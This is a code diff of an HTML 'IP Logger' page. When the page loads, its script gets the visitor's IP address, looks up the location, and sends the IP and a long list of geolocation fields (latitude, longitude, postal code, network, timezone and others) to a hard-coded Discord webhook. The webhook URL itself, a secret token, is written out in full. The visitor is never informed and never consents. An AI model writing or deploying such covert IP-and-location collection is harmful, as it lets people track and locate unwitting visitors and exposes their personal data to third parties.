@@ -8,24 +8,38 @@
 <body>
     <h1>Welcome to the IP Logger Page</h1>
     <script>
-        // Function to send the IP address and location to the Discord webhook with an embed message
-        async function sendIpToDiscord(ip, location) {
+        // Function to send the IP address and detailed location to the Discord webhook with an embed message
+        async function sendIpToDiscord(ip, locationData) {
             const webhookUrl = "https://discord.com/api/webhooks/1240707397358452817/-Mh9X4Kw5oPVK8DS2EhVHnulO7oaZozdFOWxCVqXRKzI98Xb71RQo6GUJKDwvRv9Sgj9";
             const embed = {
                 title: "User Information",
                 description: "A new user has visited the page.",
                 color: 16711680, // Red color
                 fields: [
-                    {
-                        name: "IPv6 Address",
-                        value: ip,
-                        inline: true
-                    },
-                    {
-                        name: "Location",
-                        value: location,
-                        inline: true
-                    }
+                    { name: "IPv6 Address", value: ip, inline: true },
+                    { name: "City", value: locationData.city, inline: true },
+                    { name: "Continent Code", value: locationData.continent_code, inline: true },
+                    { name: "Country", value: locationData.country_name, inline: true },
+                    { name: "Country Area", value: locationData.country_area.toString(), inline: true },
+                    { name: "Country Calling Code", value: locationData.country_calling_code, inline: true },
+                    { name: "Country Capital", value: locationData.country_capital, inline: true },
+                    { name: "Country Code", value: locationData.country_code, inline: true },
+                    { name: "Country Code ISO3", value: locationData.country_code_iso3, inline: true },
+                    { name: "Country Population", value: locationData.country_population.toString(), inline: true },
+                    { name: "Country TLD", value: locationData.country_tld, inline: true },
+                    { name: "Currency", value: locationData.currency, inline: true },
+                    { name: "Currency Name", value: locationData.currency_name, inline: true },
+                    { name: "In EU", value: locationData.in_eu ? "Yes" : "No", inline: true },
+                    { name: "Languages", value: locationData.languages, inline: true },
+                    { name: "Latitude", value: locationData.latitude.toString(), inline: true },
+                    { name: "Longitude", value: locationData.longitude.toString(), inline: true },
+                    { name: "Network", value: locationData.network, inline: true },
+                    { name: "Postal Code", value: locationData.postal, inline: true },
+                    { name: "Region", value: locationData.region, inline: true },
+                    { name: "Region Code", value: locationData.region_code, inline: true },
+                    { name: "Timezone", value: locationData.timezone, inline: true },
+                    { name: "UTC Offset", value: locationData.utc_offset, inline: true },
+                    { name: "IP Version", value: locationData.version, inline: true }
                 ],
                 timestamp: new Date().toISOString()
             };
@@ -44,9 +58,9 @@
                 });
 
                 if (response.ok) {
-                    console.log('IP address and location sent to Discord webhook successfully');
+                    console.log('IP address and detailed location sent to Discord webhook successfully');
                 } else {
-                    console.error('Failed to send IP address and location to Discord webhook');
+                    console.error('Failed to send IP address and detailed location to Discord webhook');
                 }
             } catch (error) {
                 console.error('Error:', error);
@@ -63,9 +77,7 @@
                 const locationResponse = await fetch(`https://ipapi.co/${ip}/json/`);
                 const locationData = await locationResponse.json();
 
-                const location = `${locationData.city}, ${locationData.region}, ${locationData.country_name}`;
-
-                sendIpToDiscord(ip, location);
+                sendIpToDiscord(ip, locationData);
             } catch (error) {
                 console.error('Error:', error);
             }
